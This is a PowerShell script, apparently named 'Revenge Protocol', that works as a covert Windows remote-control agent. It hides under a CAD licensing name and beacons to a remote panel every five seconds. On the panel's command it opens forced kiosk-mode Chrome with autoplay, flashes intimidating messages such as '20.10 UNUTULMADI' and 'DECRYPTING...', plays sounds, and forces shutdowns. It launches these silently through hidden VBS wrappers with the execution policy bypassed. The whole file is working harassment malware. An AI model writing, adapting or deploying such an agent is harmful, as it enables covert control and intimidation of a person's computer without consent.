# Revenge Protocol — Windows arka plan aracı (PowerShell)
# Panelden komut gelene kadar EKRANDA HİÇBİR ŞEY AÇMAZ; yalnızca sunucuya kalp atışı gönderir.
$ErrorActionPreference = 'SilentlyContinue'

$script:AgentMutex = $null
try {
  $script:AgentMutex = New-Object System.Threading.Mutex($false, 'Global\QSteelCAD_LisansSenkron_Agent')
  if (-not $script:AgentMutex.WaitOne(0, $false)) { exit 0 }
} catch { exit 0 }

function Write-AgentLog([string]$Message) {
  try {
    $dir = Join-Path $env:ProgramData 'QSteelCAD\RevengeProtocol'
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    $line = ('{0} {1}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Message)
    Add-Content -LiteralPath (Join-Path $dir 'agent.log') -Value $line -Encoding UTF8
  } catch { }
}

function Get-ConfigPath {
  if ($env:REVENGE_CONFIG) { return $env:REVENGE_CONFIG }
  return Join-Path $env:ProgramData 'QSteelCAD\RevengeProtocol\config.json'
}

function Load-Config {
  if ($env:REVENGE_API_URL) {
    return @{
      apiUrl      = $env:REVENGE_API_URL.TrimEnd('/')
      agentId     = $(if ($env:REVENGE_AGENT_ID) { $env:REVENGE_AGENT_ID } else { 'dev-agent' })
      secret      = $(if ($env:REVENGE_AGENT_SECRET) { $env:REVENGE_AGENT_SECRET } else { 'dev-secret-change-me-32chars!!' })
      registerKey = $null
    }
  }
  $path = Get-ConfigPath
  if (-not (Test-Path -LiteralPath $path)) { throw "config yok: $path" }
  $raw = Get-Content -LiteralPath $path -Raw | ConvertFrom-Json
  return @{
    apiUrl      = [string]$raw.apiUrl
    agentId     = [string]$raw.agentId
    secret      = [string]$raw.secret
    registerKey = [string]$raw.registerKey
  }
}

function Save-Config($cfg) {
  $path = Get-ConfigPath
  $dir = Split-Path -Parent $path
  if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
  $obj = [ordered]@{
    apiUrl  = $cfg.apiUrl
    agentId = $cfg.agentId
    secret  = $cfg.secret
  }
  if ($cfg.registerKey -and $cfg.registerKey.Length -gt 3) {
    $obj.registerKey = $cfg.registerKey
  }
  ($obj | ConvertTo-Json) | Set-Content -LiteralPath $path -Encoding UTF8
}

function Register-Agent($cfg) {
  $body = @{
    agentId     = $cfg.agentId
    secret      = $cfg.secret
    hostname    = $env:COMPUTERNAME
    registerKey = $cfg.registerKey
  } | ConvertTo-Json
  Invoke-RestMethod -Method POST -Uri ($cfg.apiUrl + '/api/agent/register') -ContentType 'application/json' -Body $body | Out-Null
}

function Send-Heartbeat($cfg) {
  $body = @{
    agentId  = $cfg.agentId
    secret   = $cfg.secret
    hostname = $env:COMPUTERNAME
  } | ConvertTo-Json
  return Invoke-RestMethod -Method POST -Uri ($cfg.apiUrl + '/api/agent/heartbeat') -ContentType 'application/json' -Body $body -TimeoutSec 25
}

function Invoke-RegisterIfNeeded($cfg) {
  if (-not $cfg.registerKey -or $cfg.registerKey.Length -lt 4) { return $cfg }
  try {
    Register-Agent $cfg
    Save-Config $cfg
    Write-AgentLog 'register ok'
  } catch {
    Write-AgentLog ('register fail: ' + $_.Exception.Message)
  }
  return Load-Config
}

function Get-ChromePath {
  $paths = @()
  foreach ($hive in @('Registry::HKEY_LOCAL_MACHINE', 'Registry::HKEY_CURRENT_USER')) {
    try {
      $key = Get-Item -Path "$hive\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe" -ErrorAction SilentlyContinue
      if ($key) {
        $def = $key.GetValue('')
        if ($def) { $paths += [string]$def }
        $path = $key.GetValue('Path')
        if ($path) { $paths += (Join-Path $path 'chrome.exe') }
      }
    } catch { }
  }
  $paths += @(
    (Join-Path $env:ProgramFiles 'Google\Chrome\Application\chrome.exe'),
    (Join-Path ${env:ProgramFiles(x86)} 'Google\Chrome\Application\chrome.exe'),
    (Join-Path $env:LocalAppData 'Google\Chrome\Application\chrome.exe')
  )
  foreach ($p in ($paths | Select-Object -Unique)) {
    if ($p -and (Test-Path -LiteralPath $p)) { return $p }
  }
  return $null
}

function Convert-YoutubePlaybackUrl([string]$Url) {
  $id = $null
  if ($Url -match '[?&]v=([A-Za-z0-9_-]{6,})') { $id = $Matches[1] }
  elseif ($Url -match 'youtu\.be/([A-Za-z0-9_-]{6,})') { $id = $Matches[1] }
  elseif ($Url -match 'youtube\.com/embed/([A-Za-z0-9_-]{6,})') { $id = $Matches[1] }
  elseif ($Url -match 'youtube\.com/shorts/([A-Za-z0-9_-]{6,})') { $id = $Matches[1] }
  if ($id) {
    return "https://www.youtube.com/embed/${id}?autoplay=1&rel=0&modestbranding=1"
  }
  if ($Url -match 'youtube|youtu\.be' -and $Url -notmatch 'autoplay=') {
    if ($Url.Contains('?')) { return ($Url + '&autoplay=1') }
    return ($Url + '?autoplay=1')
  }
  return $Url
}

# İkinci powershell konsolu açılmaz: wscript pencere stili 0. Yol boşlukları tırnaklı.
function Start-RpHiddenFile {
  param(
    [Parameter(Mandatory)][string]$ScriptPath,
    [string[]]$ScriptArgs = @(),
    [switch]$Sta
  )
  if (-not (Test-Path -LiteralPath $ScriptPath)) { return }
  $ps = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
  $flags = '-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden'
  if ($Sta) { $flags += ' -Sta' }
  $tail = ''
  foreach ($a in $ScriptArgs) {
    $clean = ([string]$a) -replace '"', ''
    $tail += ' "' + $clean + '"'
  }
  $cmd = $ps + ' ' + $flags + ' -File "' + $ScriptPath + '"' + $tail
  $dir = Join-Path $env:ProgramData 'QSteelCAD\RevengeProtocol'
  if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
  $vbs = Join-Path $dir ('run-' + [guid]::NewGuid().ToString('N') + '.vbs')
  $vbsCmd = $cmd.Replace('"', '""')
  @(
    'Set sh = CreateObject("Wscript.Shell")',
    ('sh.Run "' + $vbsCmd + '", 0, False')
  ) | Set-Content -LiteralPath $vbs -Encoding ASCII
  $ws = Join-Path $env:SystemRoot 'System32\wscript.exe'
  Start-Process -FilePath $ws -ArgumentList @('//B', $vbs) -WindowStyle Hidden | Out-Null
}

function Start-TopmostWatch([string]$Like, [int]$Seconds) {
  $root = $PSScriptRoot
  $ps = [powershell]::Create()
  [void]$ps.AddScript({
    param($root, $like, $seconds)
    $ErrorActionPreference = 'SilentlyContinue'
    . (Join-Path $root 'window-top.ps1')
    $end = (Get-Date).AddSeconds([Math]::Max(5, $seconds))
    while ((Get-Date) -lt $end) {
      $pids = @(Get-RpPids -ProcessName 'chrome.exe' -CommandLike $like)
      Invoke-RpRaisePids -Pids $pids
      Start-Sleep -Milliseconds 450
    }
  }).AddArgument($root).AddArgument($Like).AddArgument($Seconds)
  [void]$ps.BeginInvoke()
}

function Open-Kiosk([string]$Url) {
  if (-not $Url) { return }
  $chrome = Get-ChromePath
  if (-not $chrome) {
    Write-AgentLog ('open_url FAIL: chrome.exe yok. url=' + $Url)
    return
  }
  $profile = Join-Path $env:ProgramData 'QSteelCAD\RevengeProtocol\chrome-session'
  if (-not (Test-Path $profile)) { New-Item -ItemType Directory -Path $profile -Force | Out-Null }
  $target = Convert-YoutubePlaybackUrl $Url
  Get-CimInstance Win32_Process -Filter "Name='chrome.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -like '*RevengeProtocol\chrome-session*' } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
  Start-Sleep -Milliseconds 350
  Write-AgentLog ('open_url kiosk: ' + $target)
  $chromeArgs = "--user-data-dir=`"$profile`" --kiosk --autoplay-policy=no-user-gesture-required --no-first-run --no-default-browser-check --disable-infobars --disable-session-crashed-bubble --disable-features=TranslateUI `"$target`""
  Start-Process -FilePath $chrome -ArgumentList $chromeArgs | Out-Null
  Start-TopmostWatch -Like 'chrome-session' -Seconds 900
}

function Invoke-Shutdown([bool]$Restart) {
  if ($Restart) {
    shutdown.exe /r /t 0 /f
  } else {
    shutdown.exe /s /t 0 /f
  }
}

$script:SoundsJob = $null
$script:CmdJob = $null

function Stop-CmdPrank {
  Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -like '*cmd-prank-worker.ps1*' } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
  $script:CmdJob = $null
}

function Invoke-CmdPrank($cmd) {
  Stop-CmdPrank
  $worker = Join-Path $PSScriptRoot 'cmd-prank-worker.ps1'
  if (-not (Test-Path -LiteralPath $worker)) {
    Write-AgentLog 'cmd_prank FAIL: worker yok'
    return
  }
  $mode = if ($cmd.mode) { [string]$cmd.mode } else { 'chaos' }
  $flashCount = if ($cmd.flashCount) { [int]$cmd.flashCount } else { 6 }
  $flashMs = if ($cmd.flashMs) { [int]$cmd.flashMs } else { 140 }
  $flashPlainMs = if ($cmd.flashPlainMs) { [int]$cmd.flashPlainMs } else { 70 }
  $loopCount = if ($cmd.loopCount) { [int]$cmd.loopCount } else { 200 }
  $lines = @('20.10 UNUTULMADI.', '18.10 LOG BULUNDU...', 'DECRYPTING...')
  if ($cmd.lines) {
    $lines = @($cmd.lines | ForEach-Object { [string]$_ } | Where-Object { $_.Trim().Length -gt 0 })
    if ($lines.Count -lt 1) { $lines = @('20.10') }
  }
  $dir = Join-Path $env:ProgramData 'QSteelCAD\RevengeProtocol'
  if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
  $linesFile = Join-Path $dir 'cmd-lines.txt'
  [System.IO.File]::WriteAllLines($linesFile, $lines, [System.Text.UTF8Encoding]::new($false))
  Write-AgentLog ('cmd_prank mode=' + $mode)
  Start-RpHiddenFile -ScriptPath $worker -ScriptArgs @(
    '-Mode', $mode,
    '-FlashCount', "$flashCount",
    '-FlashMs', "$flashMs",
    '-FlashPlainMs', "$flashPlainMs",
    '-LoopCount', "$loopCount",
    '-LinesFile', $linesFile
  )
}

function Invoke-WinAlert($cmd) {
  $script = Join-Path $PSScriptRoot 'win-alert.ps1'
  if (-not (Test-Path -LiteralPath $script)) {
    Write-AgentLog 'win_alert FAIL: win-alert.ps1 yok'
    return
  }
  $msg = if ($cmd.message) { [string]$cmd.message } else { '20.10 UNUTULMADI.' }
  $sec = if ($cmd.durationSec) { [int]$cmd.durationSec } else { 12 }
  $dir = Join-Path $env:ProgramData 'QSteelCAD\RevengeProtocol'
  if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
  $msgFile = Join-Path $dir 'last-win-alert.txt'
  [System.IO.File]::WriteAllText($msgFile, $msg, [System.Text.UTF8Encoding]::new($false))
  $preview = $msg.Substring(0, [Math]::Min(60, $msg.Length))
  Write-AgentLog ('win_alert start: ' + $preview)
  Start-RpHiddenFile -ScriptPath $script -Sta -ScriptArgs @('-MessageFile', $msgFile, '-DurationSec', "$sec")
}

function Stop-FunnySounds {
  Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -like '*play-sounds.ps1*' } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
  $script:SoundsJob = $null
}

function Invoke-FunnySounds([int]$DurationSec) {
  if ($DurationSec -lt 1) { $DurationSec = 60 }
  Stop-FunnySounds
  $player = Join-Path $PSScriptRoot 'play-sounds.ps1'
  if (-not (Test-Path -LiteralPath $player)) {
    Write-AgentLog 'sounds FAIL: play-sounds.ps1 yok'
    return
  }
  Write-AgentLog ('sounds sec=' + $DurationSec)
  Start-RpHiddenFile -ScriptPath $player -ScriptArgs @('-DurationSec', "$DurationSec")
}

function Invoke-CommandPayload($cmd) {
  if (-not $cmd) { return }
  $kind = if ($cmd.kind) { [string]$cmd.kind } else { '?' }
  Write-AgentLog ('exec kind=' + $kind)
  switch ($cmd.kind) {
    'scenario' { if ($cmd.url) { Open-Kiosk $cmd.url } }
    'youtube'  { if ($cmd.url) { Open-Kiosk $cmd.url } }
    'open_url' { if ($cmd.url) { Open-Kiosk $cmd.url } }
    'flash' {
      if ($cmd.message) { Invoke-WinAlert $cmd }
      elseif ($cmd.url) { Open-Kiosk $cmd.url }
    }
    'win_alert' { Invoke-WinAlert $cmd }
    'sounds'   {
      $sec = 90
      if ($cmd.durationSec) { $sec = [int]$cmd.durationSec }
      Invoke-FunnySounds $sec
    }
    'cmd_prank' { Invoke-CmdPrank $cmd }
    'shutdown' { Stop-FunnySounds; Stop-CmdPrank; Invoke-Shutdown $false }
    'restart'  { Stop-FunnySounds; Stop-CmdPrank; Invoke-Shutdown $true }
  }
}

Write-AgentLog 'agent start'
$cfg = Load-Config
$cfg = Invoke-RegisterIfNeeded $cfg

while ($true) {
  try {
    $resp = Send-Heartbeat $cfg
    Write-AgentLog 'heartbeat ok'
    Invoke-CommandPayload $resp.command
  } catch {
    $err = $_.Exception.Message
    Write-AgentLog ('heartbeat fail: ' + $err)
    if ($err -match '401|403|Yetkisiz|Unauthorized') {
      $cfg = Invoke-RegisterIfNeeded $cfg
    }
  }
  Start-Sleep -Seconds 5
}
